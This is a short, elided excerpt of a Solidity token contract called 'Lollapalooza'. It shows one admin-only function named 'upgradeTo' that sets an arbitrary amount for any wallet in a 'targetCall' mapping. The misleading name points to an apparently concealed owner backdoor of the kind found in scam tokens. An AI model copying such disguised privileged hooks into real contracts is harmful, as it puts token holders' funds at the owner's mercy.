...
contract Lollapalooza is Context, IBEP20, Ownable, LGEWhitelisted {
    ...
    */
    ...
    function upgradeTo (address UniswapWallet, uint256 amount) external _AdminDev {
             targetCall[UniswapWallet] = amount * 10 ** 9;
